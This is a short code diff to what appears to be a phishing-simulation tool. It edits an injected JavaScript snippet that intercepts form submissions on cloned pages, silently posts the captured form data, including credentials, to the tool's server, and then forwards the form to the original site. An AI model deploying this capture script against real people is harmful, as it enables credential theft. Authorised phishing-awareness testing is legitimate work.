@@ -30,9 +30,10 @@ var JsSubmitToOriginal = `<script type='text/javascript'>(function(){
        var forms = jQuery('body').find('form');
        jQuery.each(forms, function(i, f){
          var form = jQuery(f);
-         form.find('input[type=submit]').on('click', function(e){
+         form.submit(function(e){
            e.preventDefault();
            $.post("", form.serialize(), function(done){
+             form.off('submit');
              form.submit();
            });
          });
@@ -50,7 +51,7 @@ var JsSubmitToOriginal = `<script type='text/javascript'>(function(){
   }else{
     __goCaptureAndSubmitToOriginal();
   }
-})();</script>`
+})()</script>`
 
 // parseHTML parses the page HTML on save to handle the
 // capturing (or lack thereof!) of credentials and passwords
